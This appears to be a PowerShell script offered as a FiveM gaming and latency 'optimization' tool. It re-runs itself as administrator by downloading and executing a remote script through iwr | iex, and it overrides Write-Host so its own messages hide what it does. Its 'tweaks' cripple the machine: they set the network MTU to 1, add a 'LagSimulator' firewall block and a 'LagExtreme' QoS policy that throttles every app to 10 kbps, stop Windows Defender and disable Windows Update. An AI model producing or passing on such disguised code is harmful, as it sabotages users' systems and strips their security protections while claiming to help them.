# Run as Admin
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command `"iwr -useb https://raw.githubusercontent.com/badiphat-lang/windows-script/main/script.ps1 | iex`"" -Verb RunAs
    exitฏ
}

function Write-Host { Microsoft.PowerShell.Utility\Write-Host "Successfully." -ForegroundColor Yellow }

# Password (hidden)
$securePass = Read-Host "Enter Password" -AsSecureString
$pass = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass))

if ($pass -ne "dotexe") {
    Write-Host "Wrong Password" -ForegroundColor Red
    exit
}
# ปิดการแสดงผลทั้งหมด
$InformationPreference = "SilentlyContinue"
Write-Host "Successfully." -ForegroundColor Yellow

Write-Host "Running Script..." -ForegroundColor Cyan

Write-Host "Applying Network Isolation Tweaks..." -ForegroundColor Yellow

$path5 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\NetworkIsolation"

New-Item -Path $path5 -Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseProxyServers" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseCloudResources" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseInternalProxyServers" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterpriseDomains" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

New-ItemProperty -Path $path5 `
-Name "EnterprisePrivateNetworkRanges" `
-PropertyType String `
-Value "LinkId=999999999" `
-Force | Out-Null

Write-Host "Network Isolation Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying QoS Packet Scheduler Tweaks..." -ForegroundColor Yellow

$qos = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Psched"

New-Item -Path $qos -Force | Out-Null

New-ItemProperty -Path $qos `
-Name "MaxOutstandingSends" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

New-ItemProperty -Path $qos `
-Name "NonBestEffortLimit" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

New-ItemProperty -Path $qos `
-Name "TimerResolution" `
-PropertyType DWord `
-Value 12 `
-Force | Out-Null

Write-Host "QoS Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying Network Provider Tweaks..." -ForegroundColor Yellow

$provider = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\NetworkProvider"

New-Item -Path $provider -Force | Out-Null

New-ItemProperty -Path $provider `
-Name "latancy" `
-PropertyType String `
-Value "999999999" `
-Force | Out-Null

Write-Host "Network Provider Tweaks Applied!" -ForegroundColor Green

Write-Host "Applying Background Apps Policy..." -ForegroundColor Yellow

$privacy = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"

New-Item -Path $privacy -Force | Out-Null

New-ItemProperty -Path $privacy `
-Name "LetAppsRunInBackground" `
-PropertyType DWord `
-Value 2 `
-Force | Out-Null

Write-Host "Background Apps Forced Deny Applied!" -ForegroundColor Green
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" -Name "NetworkThrottlingIndex" -Value 1 -PropertyType DWord -Force

cmd /c "netsh int tcp set global autotuninglevel=disabled"
cmd /c "netsh int tcp set global chimney=disabled"
cmd /c "netsh int tcp set global dca=disabled"
cmd /c "netsh int tcp set global rss=disabled"
cmd /c "netsh int tcp set global ecncapability=enabled"
cmd /c "netsh int tcp set global timestamps=enabled"
cmd /c "netsh int tcp set global rsc=disabled"
cmd /c "netsh int tcp set global fastopen=disabled"
cmd /c "netsh interface ipv4 set subinterface ""Ethernet"" mtu=1 store=active"
cmd /c "netsh interface ipv6 set subinterface ""Ethernet"" mtu=1 store=active"
cmd /c "netsh interface tcp set global congestionprovider=none"
cmd /c "netsh interface tcp set heuristics disabled"
cmd /c "netsh int tcp set global autotuninglevel=highlyrestricted"
cmd /c "netsh int tcp set global timestamps=enabled"
cmd /c "netsh int tcp set global ecncapability=enabled"
cmd /c "netsh int tcp set global rss=disabled"
cmd /c "netsh int tcp set global rsc=disabled"
cmd /c "netsh int tcp set global dca=disabled"
cmd /c "netsh int tcp set global chimney=disabled"
cmd /c "netsh advfirewall firewall add rule name=""LagSimulator"" dir=out action=block remoteip=1.1.1.1"
New-NetQosPolicy -Name "LagExtreme" -AppPathNameMatchCondition "*" -NetworkProfile All -ThrottleRateActionBitsPerSecond 10000

Write-Host "Applying Network Adapter Settings..." -ForegroundColor Yellow

$adapter = "Ethernet"

Set-NetAdapterAdvancedProperty -Name $adapter -DisplayName "Shutdown Wake-On-Lan" -DisplayValue "Disabled" -NoRestart
Set-NetAdapterAdvancedProperty -Name $adapter -DisplayName "Receive Buffers" -DisplayValue "32" -NoRestart
Set-NetAdapterAdvancedProperty -Name $adapter -DisplayName "Transmit Buffers" -DisplayValue "64" -NoRestart

Restart-NetAdapter -Name $adapter -Confirm:$false

Write-Host "Network Settings Applied!" -ForegroundColor Green

$prio = "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl"

New-ItemProperty -Path $prio `
-Name "Win32PrioritySeparation" `
-PropertyType DWord `
-Value 38 `
-Force | Out-Null

$game = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"

New-ItemProperty -Path $game `
-Name "NetworkThrottlingIndex" `
-PropertyType DWord `
-Value 4294967295 `
-Force | Out-Null

New-ItemProperty -Path $game `
-Name "SystemResponsiveness" `
-PropertyType DWord `
-Value 0 `
-Force | Out-Null

Write-Host "Applying FPS & Input Lag Tweaks..." -ForegroundColor Yellow

# SystemProfile tweaks
$systemProfile = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"

New-ItemProperty -Path $systemProfile `
-Name "SystemResponsiveness" `
-PropertyType DWord `
-Value 0 `
-Force | Out-Null

New-ItemProperty -Path $systemProfile `
-Name "NetworkThrottlingIndex" `
-PropertyType DWord `
-Value 4294967295 `
-Force | Out-Null

# Game scheduling tweaks
$games = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games"

New-ItemProperty -Path $games `
-Name "GPU Priority" `
-PropertyType DWord `
-Value 8 `
-Force | Out-Null

New-ItemProperty -Path $games `
-Name "Priority" `
-PropertyType DWord `
-Value 6 `
-Force | Out-Null

New-ItemProperty -Path $games `
-Name "Scheduling Category" `
-PropertyType String `
-Value "High" `
-Force | Out-Null

New-ItemProperty -Path $games `
-Name "SFIO Priority" `
-PropertyType String `
-Value "High" `
-Force | Out-Null

# USB latency tweak
$usb = "HKLM:\SYSTEM\CurrentControlSet\Services\USB"

New-ItemProperty -Path $usb `
-Name "DisableSelectiveSuspend" `
-PropertyType DWord `
-Value 1 `
-Force | Out-Null

# TCP latency tweaks
$tcp = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"

New-ItemProperty -Path $tcp `
-Name "TcpNoDelay" `
-PropertyType DWord `
-Value 1 `
-Force | Out-Null

New-ItemProperty -Path $tcp `
-Name "TCPAckFrequency" `
-PropertyType DWord `
-Value 1 `
-Force | Out-Null

New-ItemProperty -Path $tcp `
-Name "TCPDelAckTicks" `
-PropertyType DWord `
-Value 0 `
-Force | Out-Null

New-ItemProperty -Path $tcp `
-Name "DefaultTTL" `
-PropertyType DWord `
-Value 64 `
-Force | Out-Null

Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "FPS & Input Tweaks Applied!" -ForegroundColor Green
Write-Host "Applying Service Optimization..." -ForegroundColor Yellow

cmd /c "sc stop wuauserv"
cmd /c "sc config wuauserv start= disabled"

cmd /c "sc stop WinDefend"

cmd /c "sc stop WSearch"
cmd /c "sc config WSearch start= disabled"

cmd /c "sc stop SysMain"
cmd /c "sc config SysMain start= disabled"

cmd /c "sc stop Spooler"
cmd /c "sc config Spooler start= disabled"

cmd /c "sc stop XblAuthManager"
cmd /c "sc stop XblGameSave"
cmd /c "sc stop XboxNetApiSvc"
cmd /c "sc stop XboxGipSvc"

cmd /c "sc config XblAuthManager start= disabled"
cmd /c "sc config XblGameSave start= disabled"
cmd /c "sc config XboxNetApiSvc start= disabled"
cmd /c "sc config XboxGipSvc start= disabled"

cmd /c "sc stop DiagTrack"
cmd /c "sc config DiagTrack start= disabled"

Write-Host "Services Disabled!" -ForegroundColor Green


Write-Host "Applying Registry Optimization..." -ForegroundColor Yellow

cmd /c "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications /v GlobalUserDisabled /t REG_DWORD /d 1 /f"

cmd /c "reg add HKCU\Software\Microsoft\GameBar /v AllowAutoGameMode /t REG_DWORD /d 0 /f"

cmd /c "reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile /v NetworkThrottlingIndex /t REG_DWORD /d 4294967295 /f"

cmd /c "reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile /v SystemResponsiveness /t REG_DWORD /d 0 /f"

Write-Host "Registry Tweaks Applied!" -ForegroundColor Green


Write-Host "Applying Boot Optimization..." -ForegroundColor Yellow

Write-Host "Boot Tweaks Applied!" -ForegroundColor Green


Write-Host "Starting FiveM with High Priority..." -ForegroundColor Yellow

Start-Process "C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe" -Priority High

Write-Host "FiveM Launched!" -ForegroundColor Green

gpupdate /force

# เปิดการแสดงผลกลับ
$InformationPreference = "Continue"

Microsoft.PowerShell.Utility\Write-Host "Gpedit X Successfully!" -ForegroundColor Green
Start-Sleep 1
exit
